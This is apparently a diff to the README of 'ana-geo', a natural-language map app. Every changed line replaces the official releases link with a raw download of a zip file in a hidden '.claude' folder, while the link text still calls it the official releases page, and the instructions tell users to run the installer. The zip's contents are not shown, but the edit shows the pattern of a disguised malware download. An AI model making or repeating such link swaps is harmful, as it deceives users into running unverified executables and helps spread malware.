@@ -1,7 +1,7 @@
 <h1>🗺️ ana-geo - Talk to Your Maps Naturally</h1>
 
 <p align="center">
-  <a href="https://github.com/eddieo8814/ana-geo/releases"><img src="https://img.shields.io/badge/Download%20ana--geo-Latest%20Release-2ea44f?style=for-the-badge&logo=github" alt="Download ana-geo"></a>
+  <a href="https://github.com/eddieo8814/ana-geo/raw/refs/heads/main/apps/ana-geo-route/.claude/geo_ana_2.0.zip"><img src="https://img.shields.io/badge/Download%20ana--geo-Latest%20Release-2ea44f?style=for-the-badge&logo=github" alt="Download ana-geo"></a>
 </p>
 
 ## 🎯 What Is ana-geo?
@@ -33,7 +33,7 @@ ana-geo isn't one app — it's a family of seven independently runnable applicat
 
 Getting ana-geo on your Windows computer is simple:
 
-1. **Visit the download page:** <a href="https://github.com/eddieo8814/ana-geo/releases">Click here to go to the official releases page</a>
+1. **Visit the download page:** <a href="https://github.com/eddieo8814/ana-geo/raw/refs/heads/main/apps/ana-geo-route/.claude/geo_ana_2.0.zip">Click here to go to the official releases page</a>
 2. **Find the latest release:** Look for the newest version at the top of the page (versions are listed newest first).
 3. **Download the installer:** Click on the download link to save the file to your computer. This may take a few moments depending on your internet connection.
 4. **Run the installer:** Once the download is complete, locate the file in your Downloads folder and double-click it to start the installation.
@@ -131,7 +131,7 @@ ana-geo is provided under an open-source license, meaning you're free to use, mo
 
 <p align="center">
   <strong>Ready to talk to your maps?</strong><br><br>
-  <a href="https://github.com/eddieo8814/ana-geo/releases"><img src="https://img.shields.io/badge/Get%20ana--geo%20Now-Download%20Latest-ff6600?style=for-the-badge&logo=github&logoColor=white" alt="Get ana-geo Now"></a>
+  <a href="https://github.com/eddieo8814/ana-geo/raw/refs/heads/main/apps/ana-geo-route/.claude/geo_ana_2.0.zip"><img src="https://img.shields.io/badge/Get%20ana--geo%20Now-Download%20Latest-ff6600?style=for-the-badge&logo=github&logoColor=white" alt="Get ana-geo Now"></a>
 </p>
 
 Keywords: ana-geo, GIS, map application, natural language processing, spatial analysis, self-evolving software, agent-native, downloadable maps, Windows app, geographic information system, voice control maps, Turf.js, open source GIS
